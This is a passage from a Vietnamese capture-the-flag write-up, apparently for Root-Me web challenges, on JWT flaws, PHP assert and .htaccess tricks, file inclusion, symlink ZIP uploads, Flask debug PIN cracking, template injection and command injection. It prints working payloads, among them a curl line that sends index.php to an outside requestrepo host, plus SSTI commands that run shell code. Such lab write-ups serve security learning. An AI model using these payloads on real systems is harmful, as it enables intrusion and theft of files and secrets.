<p>ta sẽ bypass cả mime type + null byte</p>
<p><img src="https://hackmd.io/_uploads/HJWb8Xak1l.png" alt="image"></p>
<p>flag: <code>YPNchi2NmTwygr2dgCCF</code></p>
<h2 id="jwt---revoked-token">JWT - Revoked token</h2>
<p><img src="https://hackmd.io/_uploads/ryK5IXaJkx.png" alt="image"></p>
<p>để bài cho 2 api và source code</p>
<pre><code>#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from flask import Flask, request, jsonify
from flask_jwt_extended import JWTManager, jwt_required, create_access_token, decode_token
import datetime
#from apscheduler.schedulers.background import BackgroundScheduler
import threading
import jwt
from config import *
 
# Setup flask
app = Flask(__name__)
 
app.config['JWT_SECRET_KEY'] = SECRET
jwtmanager = JWTManager(app)
blacklist = set()
lock = threading.Lock()
 
# Free memory from expired tokens, as they are no longer useful
def delete_expired_tokens():
    with lock:
        to_remove = set()
        global blacklist
        for access_token in blacklist:
            try:
                jwt.decode(access_token, app.config['JWT_SECRET_KEY'],algorithm='HS256')
            except:
                to_remove.add(access_token)
       
        blacklist = blacklist.difference(to_remove)
 
@app.route(&quot;/web-serveur/ch63/&quot;)
def index():
    return &quot;POST : /web-serveur/ch63/login &lt;br&gt;\nGET : /web-serveur/ch63/admin&quot;
 
# Standard login endpoint
@app.route('/web-serveur/ch63/login', methods=['POST'])
def login():
    try:
        username = request.json.get('username', None)
        password = request.json.get('password', None)
    except:
        return jsonify({&quot;msg&quot;:&quot;&quot;&quot;Bad request. Submit your login / pass as {&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;}&quot;&quot;&quot;}), 400
 
    if username != 'admin' or password != 'admin':
        return jsonify({&quot;msg&quot;: &quot;Bad username or password&quot;}), 401
 
    access_token = create_access_token(identity=username,expires_delta=datetime.timedelta(minutes=3))
    ret = {
        'access_token': access_token,
    }
   
    with lock:
        blacklist.add(access_token)
 
    return jsonify(ret), 200
 
# Standard admin endpoint
@app.route('/web-serveur/ch63/admin', methods=['GET'])
@jwt_required
def protected():
    access_token = request.headers.get(&quot;Authorization&quot;).split()[1]
    with lock:
        if access_token in blacklist:
            return jsonify({&quot;msg&quot;:&quot;Token is revoked&quot;})
        else:
            return jsonify({'Congratzzzz!!!_flag:': FLAG})
 
 
if __name__ == '__main__':
    scheduler = BackgroundScheduler()
    job = scheduler.add_job(delete_expired_tokens, 'interval', seconds=10)
    scheduler.start()
    app.run(debug=False, host='0.0.0.0', port=5000)
</code></pre><p><img src="https://hackmd.io/_uploads/rkx89Q6Jkx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/SJYU97ay1l.png" alt="image"></p>
<p>vì nếu đăng nhập với người dùng thì sẽ tạo ra 1 token và đưa token đó vào trong black-list, do nếu token trong black-list sẽ in ra revoke nên ta sẽ dùng <code>Thủ thuật 2: RFC 4648</code> khi thêm các kí tự ngoài bằng ascii 2 sẽ bị bỏ qua</p>
<p><img src="https://hackmd.io/_uploads/S1lxjXTJJl.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/B18bimpkyx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/BJtQjQTy1x.png" alt="image"></p>
<p>nó chỉ cảnh báo chứ không lỗi</p>
<p>flag: <code>Do_n0t_r3v0ke_3nc0d3dTokenz_Mam3ne-Us3_th3_JTI_f1eld</code></p>
<h2 id="jwt---weak-secret">JWT - Weak secret</h2>
<p>như tên thì key yếu thì brute thôi</p>
<p><img src="https://hackmd.io/_uploads/SJH80QTkJx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HkMFC7p1Je.png" alt="image"></p>
<p><a href="https://blog.intigriti.com/hacking-tools/hacker-tools-jwt-tool">https://blog.intigriti.com/hacking-tools/hacker-tools-jwt-tool</a></p>
<p><img src="https://hackmd.io/_uploads/rJt1yET11x.png" alt="image"></p>
<p>secret key là lol</p>
<p><img src="https://hackmd.io/_uploads/HJ5BkETy1l.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/ryE91Np1Jx.png" alt="image"></p>
<p>flag: <code>PleaseUseAStrongSecretNextTime</code></p>
<h2 id="jwt---unsecure-file-signature">JWT - Unsecure File Signature</h2>
<p><img src="https://hackmd.io/_uploads/BJM1eN6kyx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/r1NkBVakyl.png" alt="image"></p>
<p>đây là kĩ thuật tấn công via kid header - secret sẽ được lấy ở tên file trong kid ta sẽ trỏ nó đến dev/null để secret key là null, do ở đây có filter nên ta bypass path traversal, điều kiện thứ 2 là phần signature sẽ trả ra null, do đó ta dùng <code>AA==</code></p>
<p><img src="https://hackmd.io/_uploads/B1MRVEpJ1e.png" alt="image"></p>
<p>flag: <code>RM{Uns3cUr3_f1l3_H4ndl1nG!!}</code></p>
<h2 id="php---assert">PHP - assert()</h2>
<p><img src="https://hackmd.io/_uploads/SyNirV6kye.png" alt="image"></p>
<p>bài này assert dính rce nên mình sẽ làm luôn</p>
<p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#rce-via-assert">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#rce-via-assert</a></p>
<p><img src="https://hackmd.io/_uploads/H1-G8EpJkg.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/ryD4U4Tkye.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/H1oBL4TkJg.png" alt="image"></p>
<p>flag: <code>x4Ss3rT1nglSn0ts4f3A7A1Lx</code></p>
<h2 id="php---apache-configuration">PHP - Apache configuration</h2>
<p><img src="https://hackmd.io/_uploads/S1d5LVTJke.png" alt="image"></p>
<p>cho phép upload tất cả các loại file trừ php</p>
<p><img src="https://hackmd.io/_uploads/By0a8N61ye.png" alt="image"></p>
<p>ta thấy hint <code>.htaccess</code> mình nghĩ ngay đến upload .htaccess để cho phép 1 file được thực thi như php</p>
<p><img src="https://hackmd.io/_uploads/SkUAKNayyx.png" alt="image"></p>
<pre><code>Options All +Indexes

&lt;IfModule mod_php7.c&gt;
    php_flag engine on
&lt;/IfModule&gt;

&lt;FilesMatch &quot;pwn&quot;&gt;
  SetHandler  application/x-httpd-php
&lt;/FilesMatch&gt;
</code></pre><p><img src="https://hackmd.io/_uploads/B1Ke5Ea1yx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/B1XbcEa1Jl.png" alt="image"></p>
<p>flag: <code>ht@cc3ss2RCE4th%w1n</code></p>
<h2 id="php---filters">PHP - Filters</h2>
<p><img src="https://hackmd.io/_uploads/Skzu946kJl.png" alt="image"></p>
<p>trông có vẻ khá sú</p>
<p><img src="https://hackmd.io/_uploads/r1FsjV6kJg.png" alt="image"></p>
<p>nghĩ ngay đến lfi thử ngay:</p>
<p><img src="https://hackmd.io/_uploads/SkETjNaJ1e.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HJvAoNp1yx.png" alt="image"></p>
<p>thấy passwd nằm ở file config</p>
<p><img src="https://hackmd.io/_uploads/Hk0k3ET1kl.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HkOenNpyyx.png" alt="image"></p>
<p>pass admin: <code>DAPt9D2mky0APAF</code></p>
<p><img src="https://hackmd.io/_uploads/H1fM34TJJe.png" alt="image"></p>
<p>flag: <code>DAPt9D2mky0APAF</code></p>
<h2 id="php---register-globals">PHP - register globals</h2>
<p><img src="https://hackmd.io/_uploads/H12d3ETk1x.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/H1E93E6yke.png" alt="image"></p>
<p>không thấy có manh mối gì thử scan</p>
<p><img src="https://hackmd.io/_uploads/ByqX64pJJx.png" alt="image"></p>
<p>mình thử nhập tay để tìm file backup thì được luôn vì hint là backup</p>
<p>không thì scan cũng ra</p>
<p><img src="https://hackmd.io/_uploads/rJN8TVpyye.png" alt="image"></p>
<pre><code>&lt;?php

function auth($password, $hidden_password){
    $res=0;
    if (isset($password) &amp;&amp; $password!=&quot;&quot;){
        if ( $password == $hidden_password ){
            $res=1;
        }
    }
    $_SESSION[&quot;logged&quot;]=$res;
    return $res;
}


function display($res){
    $aff= '
	  &lt;html&gt;
	  &lt;head&gt;
	  &lt;/head&gt;
	  &lt;body&gt;
	    &lt;h1&gt;Authentication v 0.05&lt;/h1&gt;
	    &lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;
	      Password&amp;nbsp;&lt;br/&gt;
	      &lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;&lt;br/&gt;&lt;br/&gt;
	      &lt;br/&gt;&lt;br/&gt;
	      &lt;input type=&quot;submit&quot; value=&quot;connect&quot; /&gt;&lt;br/&gt;&lt;br/&gt;
	    &lt;/form&gt;
	    &lt;h3&gt;'.htmlentities($res).'&lt;/h3&gt;
	  &lt;/body&gt;
	  &lt;/html&gt;';
    return $aff;
}



session_start();
if ( ! isset($_SESSION[&quot;logged&quot;]) )
    $_SESSION[&quot;logged&quot;]=0;

$aff=&quot;&quot;;
include(&quot;config.inc.php&quot;);

if (isset($_POST[&quot;password&quot;]))
    $password = $_POST[&quot;password&quot;];

if (!ini_get('register_globals')) {
    $superglobals = array($_SERVER, $_ENV,$_FILES, $_COOKIE, $_POST, $_GET);
    if (isset($_SESSION)) {
        array_unshift($superglobals, $_SESSION);
    }
    foreach ($superglobals as $superglobal) {
        extract($superglobal, 0 );
    }
}

if (( isset ($password) &amp;&amp; $password!=&quot;&quot; &amp;&amp; auth($password,$hidden_password)==1) || (is_array($_SESSION) &amp;&amp; $_SESSION[&quot;logged&quot;]==1 ) ){
    $aff=display(&quot;well done, you can validate with the password : $hidden_password&quot;);
} else {
    $aff=display(&quot;try again&quot;);
}

echo $aff;

?&gt;

</code></pre><p>ta có thể thấy ở đây khi khởi tạo session thì kiếm tra logged trong session có tồn tại không , nếu chưa thù khởi tạo là 0.</p>
<p>kiểm tra pass word nếu có thì gán vào biến, khởi tạo các biến superglobals nếu chưa tồn tại <code>ini_get('register_globals')</code> khởi tạo một mảng với các biến.</p>
<p>Kiểm tra password nếu đúng thì password là flag, nếu sai thì not allow</p>
<p><a href="https://security.stackexchange.com/questions/49375/possible-ways-of-exploiting-php-register-globals">https://security.stackexchange.com/questions/49375/possible-ways-of-exploiting-php-register-globals</a></p>
<p>searching register_global</p>
<p><a href="https://stackoverflow.com/questions/21368051/register-globals-exploit-session-array">https://stackoverflow.com/questions/21368051/register-globals-exploit-session-array</a></p>
<p><img src="https://hackmd.io/_uploads/Hkxs_-AJJx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/rkMxYbCy1g.png" alt="image"></p>
<p>flag: <code>NoTQYipcRKkgrqG</code></p>
<h2 id="php---remote-xdebug">PHP - Remote Xdebug</h2>
<p><img src="https://hackmd.io/_uploads/r1V7tZAyJe.png" alt="image"></p>
<p>qúa quen thuộc với x-debug rồi nên ta sẽ vào khai thác.</p>
<p><a href="https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py">https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py</a></p>
<p><a href="https://blog.csdn.net/qq_43645782/article/details/107040426">https://blog.csdn.net/qq_43645782/article/details/107040426</a></p>
<p><a href="https://blog.csdn.net/weixin_43416469/article/details/114143522">https://blog.csdn.net/weixin_43416469/article/details/114143522</a></p>
<h2 id="python---server-side-template-injection-introduction">Python - Server-side Template Injection Introduction</h2>
<p><img src="https://hackmd.io/_uploads/HywZrQCkJl.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/H1HvB7R1yl.png" alt="image"></p>
<p>fuzz chút thì nó là Jinja2</p>
<p><code>{{ cycler.__init__.__globals__.os.popen('id').read() }}</code></p>
<p><img src="https://hackmd.io/_uploads/SkP9w7R11e.png" alt="image"></p>
<p>flag: <code>Python_SST1_1s_co0l_4nd_mY_p4yl04ds_4r3_1ns4n3!!!</code></p>
<h2 id="file-upload---zip">File upload - ZIP</h2>
<p><img src="https://hackmd.io/_uploads/SkmHdQRykl.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/SycxK70kkx.png" alt="image"></p>
<p>cho phép bạn upload một file zip và giải nén nó</p>
<p><img src="https://hackmd.io/_uploads/HknGK7C11g.png" alt="image"></p>
<p>thử upload zip chưa file php nhưng bị cấm rồi</p>
<p><img src="https://hackmd.io/_uploads/Sk58Y7AJye.png" alt="image"></p>
<p>quan sát ở đây mình có ý tưởng là upload 1 file symlink đến file index.php</p>
<pre><code>l3mnt2010@ASUSEXPERTBOOK:~/rootme/hihi/hiha/hiho$ ln -s ../../../index.php a.txt
l3mnt2010@ASUSEXPERTBOOK:~/rootme/hihi/hiha/hiho$ zip --symlinks a.zip a.
a.php  a.txt  a.zip
l3mnt2010@ASUSEXPERTBOOK:~/rootme/hihi/hiha/hiho$ zip --symlinks a.zip a.txt
  adding: a.txt (stored 0%)
l3mnt2010@ASUSEXPERTBOOK:~/rootme/hihi/hiha/hiho$
</code></pre><p>nhớ thêm <code>--symlinks</code> hoặc <code>-y</code> không là nó sẽ hiển thị file tại hệ thống của bạn đấy</p>
<p><img src="https://hackmd.io/_uploads/Hk7IWEA1Jx.png" alt="image"></p>
<p>flag: <code>N3v3r_7rU5T_u5Er_1npU7</code></p>
<h2 id="flask---development-server">Flask - Development server</h2>
<p><img src="https://hackmd.io/_uploads/BynAZN011e.png" alt="image"></p>
<p>web giống với bài nào ở trên đó mình không nhớ rõ thêm chức năng search bị dính lỗi read file</p>
<p><img src="https://hackmd.io/_uploads/HJLAz4Cyye.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/r1d9QNRkyx.png" alt="image"></p>
<p>mình mò ra theo dec đề bài</p>
<pre><code>#!/usr/bin/env python3

from flask import Flask, request, render_template, abort

app = Flask(__name__, static_folder='static')

@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])
def index():
    return render_template(&quot;index.html&quot;)

@app.route(&quot;/services&quot;, methods=[&quot;GET&quot;])
def services():
    template_name = &quot;wip&quot;  # Default template name
    if &quot;search&quot; in request.args:
        template_name = request.args.get(&quot;search&quot;)
    
    try:
        # Ensure the template exists and is safe to read
        with open(template_name) as f:
            template_content = f.read()
    except FileNotFoundError:
        # Return 404 if the template file doesn't exist
        abort(404)
    except Exception as e:
        # Return internal server error for other exceptions
        return f&quot;An error occurred: {e}&quot;, 500

    return render_template(&quot;services.html&quot;, template=template_content)

if __name__ == &quot;__main__&quot;:
    app.run(host=&quot;0.0.0.0&quot;, port=8080, debug=True)

</code></pre><p><img src="https://hackmd.io/_uploads/HJRCEVAyyg.png" alt="image"></p>
<p>chưa thấy có manh mối gì</p>
<pre><code>12:perf_event:/
11:cpu,cpuacct:/user.slice
10:memory:/user.slice/user-1045.slice/user@1045.service
9:freezer:/
8:devices:/user.slice
7:rdma:/
6:hugetlb:/
5:blkio:/user.slice
4:cpuset:/
3:pids:/user.slice/user-1045.slice/user@1045.service
2:net_cls,net_prio:/
1:name=systemd:/user.slice/user-1045.slice/user@1045.service/docker-rootless.service/4acf855fca20f182bc577aa61dadfc30acbcda83c9996839c18000c5292347d7
0::/user.slice/user-1045.slice/user@1045.service/docker-rootless.service
</code></pre><p><code>a50e2df9-73cb-4207-980a-15fab2109534</code></p>
<p><code>02:42:ac:11:00:22</code></p>
<pre><code>l3mnt2010@ASUSEXPERTBOOK:~/rootme$ python3 FlaskDEBUGRCE.py --username web-app --path '/home/web-app/.local/lib/python3.11/site-packages/flask/app.py' --mac '02:42:ac:11:00:22' --cgroup '12:perf_event:/' --machine_id 'a50e2df9-73cb-4207-980a-15fab2109534' --modname flask.app --appname Flask



                        ¶         ¶
                         ¶         ¶
                     ¶   ¶         ¶   ¶
                     ¶  ¶¶         ¶¶  ¶
                     ¶¶ ¶¶¶       ¶¶¶ ¶¶
             ¶      ¶¶   ¶¶¶     ¶¶¶   ¶¶      ¶
            ¶¶      ¶¶   ¶¶¶     ¶¶¶   ¶¶      ¶¶
           ¶¶      ¶¶    ¶¶¶¶   ¶¶¶¶    ¶¶      ¶¶
           ¶¶     ¶¶¶    ¶¶¶¶  ¶¶¶¶¶    ¶¶¶     ¶¶¶
       ¶  ¶¶¶    ¶¶¶¶    ¶¶¶¶   ¶¶¶¶    ¶¶¶¶   ¶¶¶¶  ¶
       ¶¶ ¶¶¶¶¶  ¶¶¶¶   ¶¶¶¶¶   ¶¶¶¶¶   ¶¶¶¶  ¶¶¶¶¶ ¶¶
       ¶¶ ¶¶¶¶¶  ¶¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶¶  ¶¶¶¶¶ ¶¶
       ¶¶ ¶¶¶¶¶  ¶¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶¶  ¶¶¶¶¶ ¶¶
      ¶¶¶  ¶¶¶¶   ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶   ¶¶¶¶  ¶¶¶
     ¶¶¶¶  ¶¶¶¶   ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶   ¶¶¶¶  ¶¶¶¶
    ¶¶¶¶   ¶¶¶¶¶ ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶ ¶¶¶¶¶   ¶¶¶¶
   ¶¶¶¶    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶   ¶¶¶¶
   ¶¶¶¶¶  ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶  ¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
     ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
     ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
      ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
     ¶¶¶¶¶           ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶           ¶¶¶¶¶
     ¶¶¶¶¶¶             ¶¶¶¶¶¶¶¶¶¶¶¶¶             ¶¶¶¶¶¶
      ¶¶¶¶¶¶¶        ..     ¶¶¶¶¶¶¶¶¶     ..        ¶¶¶¶¶¶
       ¶¶¶¶¶¶¶¶             ¶¶¶¶¶             ¶¶¶¶¶¶¶¶
        ¶¶¶¶¶¶¶¶¶¶           ¶¶¶           ¶¶¶¶¶¶¶¶¶¶
           ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
              ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶   ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
                  ¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶
                   ¶¶¶¶¶¶¶¶       ¶¶¶¶¶¶¶¶
                  ¶¶¶¶¶¶¶¶¶       ¶¶¶¶¶¶¶¶¶
                  ¶¶¶¶¶¶¶¶¶ ¶¶¶¶¶ ¶¶¶¶¶¶¶¶¶
                 ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
                 ¶¶¶  ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶  ¶¶¶
                  ¶¶  ¶¶¶¶  ¶¶¶¶¶  ¶¶¶¶  ¶¶
                      ¶¶¶¶  ¶¶¶¶¶  ¶¶¶¶



__          __             _
\ \        / /            | |
 \ \  /\  / /   ___  _ __ | | __ ____  ___  _   _   __ _   ___  _ __
  \ \/  \/ /   / _ \| '__|| |/ /|_  / / _ \| | | | / _` | / _ \| '__|
   \  /\  /   |  __/| |   |   &lt;  / / |  __/| |_| || (_| ||  __/| |
    \/  \/     \___||_|   |_|\_\/___| \___| \__,_| \__, | \___||_|
                                                    __/ |
                                                   |___/


                Author:  https://github.com/SidneyJob
                Channel: https://t.me/SidneyJobChannel

[+] Success!
[*] PIN: 204-041-067
[*] Cookie: __wzdf44644a375dc3af0ac50=1729150319|2de21132d145
[*] Modname: flask.app
[*] Appname: wsgi_app

[+] Success!
[*] PIN: 268-308-375
[*] Cookie: __wzda1d2b8ca47b14dbc0483=1729150319|072670b649b7
[*] Modname: flask.app
[*] Appname: DebuggedApplication

[+] Success!
[*] PIN: 143-326-594
[*] Cookie: __wzd5097cc3d00d7045ae30e=1729150319|689a7a03b3d9
[*] Modname: flask.app
[*] Appname: Flask

[+] Success!
[*] PIN: 143-326-594
[*] Cookie: __wzd5097cc3d00d7045ae30e=1729150319|689a7a03b3d9
[*] Modname: flask.app
[*] Appname: Flask

[+] Success!
[*] PIN: 111-600-901
[*] Cookie: __wzd1e28508e01e7cc6bda9e=1729150319|a5e8cfd2a0c7
[*] Modname: werkzeug.debug
[*] Appname: wsgi_app

[+] Success!
[*] PIN: 572-381-524
[*] Cookie: __wzd154c11ebc8c181c13d98=1729150319|c6ea2c131b2c
[*] Modname: werkzeug.debug
[*] Appname: DebuggedApplication

[+] Success!
[*] PIN: 842-001-700
[*] Cookie: __wzdf34554bd0c2d71fb755e=1729150319|107a4a6e663a
[*] Modname: werkzeug.debug
[*] Appname: Flask

[+] Success!
[*] PIN: 842-001-700
[*] Cookie: __wzdf34554bd0c2d71fb755e=1729150319|107a4a6e663a
[*] Modname: werkzeug.debug
[*] Appname: Flask

[+] Success!
[*] PIN: 204-041-067
[*] Cookie: __wzdf44644a375dc3af0ac50=1729150319|2de21132d145
[*] Modname: flask.app
[*] Appname: wsgi_app

[+] Success!
[*] PIN: 268-308-375
[*] Cookie: __wzda1d2b8ca47b14dbc0483=1729150319|072670b649b7
[*] Modname: flask.app
[*] Appname: DebuggedApplication

[+] Success!
[*] PIN: 143-326-594
[*] Cookie: __wzd5097cc3d00d7045ae30e=1729150319|689a7a03b3d9
[*] Modname: flask.app
[*] Appname: Flask

[+] Success!
[*] PIN: 143-326-594
[*] Cookie: __wzd5097cc3d00d7045ae30e=1729150319|689a7a03b3d9
[*] Modname: flask.app
[*] Appname: Flask

[+] 12 payloads are successfully generated!
l3mnt2010@ASUSEXPERTBOOK:~/rootme$
</code></pre><p>may mắn searching một hồi về debug via path traversal mình tìm được 1 bài</p>
<p><a href="https://hackmd.io/@CP04042K/BkFYA8P0j#Path-traversal-save-the-day">https://hackmd.io/@CP04042K/BkFYA8P0j#Path-traversal-save-the-day</a></p>
<p><code>GET /services?search=/proc/sys/kernel/random/boot_id</code></p>
<p><img src="https://hackmd.io/_uploads/rywrbSAJye.png" alt="image"></p>
<p><code>GET /services?search=/home/web-app/.local/lib/python3.11/site-packages/flask/app.py</code></p>
<p><img src="https://hackmd.io/_uploads/rJaUbBCyke.png" alt="image"></p>
<p><code>GET /services?search=/proc/self/cgroup</code></p>
<p><img src="https://hackmd.io/_uploads/BJ6w-BA1kx.png" alt="image"></p>
<p><code>GET /services?search=/sys/class/net/eth0/address HTTP/1.1</code> để lấy địa chỉ MAC</p>
<p><img src="https://hackmd.io/_uploads/H1910E0k1x.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/S1HlerA1Je.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HkOlWSC1ye.png" alt="image"></p>
<p><code>__import__(&quot;os&quot;).popen('cat *').read()</code></p>
<p><img src="https://hackmd.io/_uploads/HkE7WSAkke.png" alt="image"></p>
<p>flag: <code>RM{B3_C4refull_w1th_fl4sk_d3bug}</code></p>
<h2 id="graphql---injection">GraphQL - Injection</h2>
<h2 id="command-injection---filter-bypass">Command injection - Filter bypass</h2>
<p>dec: Find a vulnerability in this service and exploit it. Some protections were added.</p>
<p><img src="https://hackmd.io/_uploads/Sy5GaB01kg.png" alt="image"></p>
<p>ta dùng list để check có khá nhiều cái qua được</p>
<p><code>ip=127.0.0.1%0Acurl%20-F%20&quot;file=@index.php&quot;%20http://00br69e7.requestrepo.com</code></p>
<p><img src="https://hackmd.io/_uploads/HkIHaH0k1e.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HkKIprA1Jl.png" alt="image"></p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;title&gt;Ping Service&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;form method=&quot;POST&quot; action=&quot;index.php&quot;&gt;
&lt;input type=&quot;text&quot; name=&quot;ip&quot; placeholder=&quot;127.0.0.1&quot;&gt;
&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
&lt;pre&gt;
&lt;?php
$flag = &quot;&quot;.file_get_contents(&quot;.passwd&quot;).&quot;&quot;;

if(isset($_POST[&quot;ip&quot;]) &amp;&amp; !empty($_POST[&quot;ip&quot;])){
$ip = @preg_replace(&quot;/[\\\$|`;&amp;&lt;&gt;]/&quot;, &quot;&quot;, $_POST[&quot;ip&quot;]);
//$ip = @str_replace(['\\', '$', '|', '`', ';', '&amp;', '&lt;', '&gt;'], &quot;&quot;, $_POST[&quot;ip&quot;]);
$response = @shell_exec(&quot;timeout 5 bash -c 'ping -c 3 &quot;.$ip.&quot;'&quot;);
$receive = @preg_match(&quot;/3 packets transmitted, (.*) received/s&quot;,$response,$out);

if ($out[1]==&quot;3&quot;)
{
echo &quot;Ping OK&quot;;
}
elseif ($out[1]==&quot;0&quot;)
{
echo &quot;Ping NOK&quot;;
}
else
{
echo &quot;Syntax Error&quot;;
}
}
?&gt;
&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p><img src="https://hackmd.io/_uploads/r1LYpS0yJx.png" alt="image"></p>
<p>flag: <code>Comma@nd_1nJec7ion_Fl@9_1337_Th3_G@m3!!!</code></p>
<h2 id="java---server-side-template-injection">Java - Server-side Template Injection</h2>
<p><img src="https://hackmd.io/_uploads/B1SCprCkkg.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/H1bxRHR1ye.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/ByvMRSRyyl.png" alt="image"></p>
<p>thử cái được luôn</p>
<p><img src="https://hackmd.io/_uploads/Sy2_1U0Jyl.png" alt="image"></p>
<p>nó là free maker của java</p>
<p><a href="https://portswigger.net/research/server-side-template-injection">https://portswigger.net/research/server-side-template-injection</a></p>
<p><code>nickname=&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; ${ ex(&quot;cat SECRET_FLAG.txt&quot;) }</code></p>
<p><img src="https://hackmd.io/_uploads/HkeF3yU0J1l.png" alt="image"></p>
<p>flag: <code>B3wareOfT3mplat3Inj3ction</code></p>
<h2 id="jwt---public-key">JWT - Public key</h2>
<h2 id="jwt---header-injection">JWT - Header Injection</h2>
<h2 id="local-file-inclusion">Local File Inclusion</h2>
<p><img src="https://hackmd.io/_uploads/rykVgLCkJl.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/H1JH-U0J1e.png" alt="image"></p>
<p>ta để ý có phần admin nhưng phải nhập pass</p>
<p>ta lfi để xem file trong /admin thì được luôn</p>
<p><img src="https://hackmd.io/_uploads/rybtWUC1Jx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HkN_W8RJ1g.png" alt="image"></p>
<p>flag: <code>OpbNJ60xYpvAQU8</code></p>
<h2 id="local-file-inclusion---double-encoding">Local File Inclusion - Double encoding</h2>
<p>như cái tên của nó thì ta start chall luôn</p>
<p>yêu cầu : <code>Find the validation password in the source files of the website.</code></p>
<p><img src="https://hackmd.io/_uploads/rktFGICJJe.png" alt="image"></p>
<p>quan sát có thể thấy chương trình dùng include và có thêm đuôi <code>.inc.php</code> ở sau ban đầu mình nghĩ là tên nó khác đuôi .inc.php nên dùng được %00 để loại bỏ đoạn đằng sau</p>
<p><img src="https://hackmd.io/_uploads/SJwLSUC1kl.png" alt="image"></p>
<p>nhưng mà bài này mình đọc dữ liệu trước -&gt; cơ bản thì nó có 2 page contact và cv</p>
<p><img src="https://hackmd.io/_uploads/B1r2S8AyJl.png" alt="image"></p>
<p>ở đây ta thấy có file conf.inc.php</p>
<p><img src="https://hackmd.io/_uploads/r188LU0kkl.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/H1hD8IAkkg.png" alt="image"></p>
<p>flag: <code>Th1sIsTh3Fl4g!</code></p>
<h2 id="node---eval">Node - Eval</h2>
<p>dec: <code>Evode Bank is a new generation online bank. This bank has created an online tool to attract new customers. Use this tool and find a way to read the file containing the flag!</code></p>
<p><img src="https://hackmd.io/_uploads/H19pLL0yJl.png" alt="image"></p>
<p>chức năng tính toán chi tiêu</p>
<p><img src="https://hackmd.io/_uploads/SJlYJDUAJJe.png" alt="image"></p>
<p>server chạy với nodejs express</p>
<p><img src="https://hackmd.io/_uploads/HyonvU0J1x.png" alt="image"></p>
<p>với đề bài là eval thì mình thử 1 chút được như sau</p>
<p><img src="https://hackmd.io/_uploads/BkV0wUCyJl.png" alt="image"></p>
<p>rev shell hình như không được:</p>
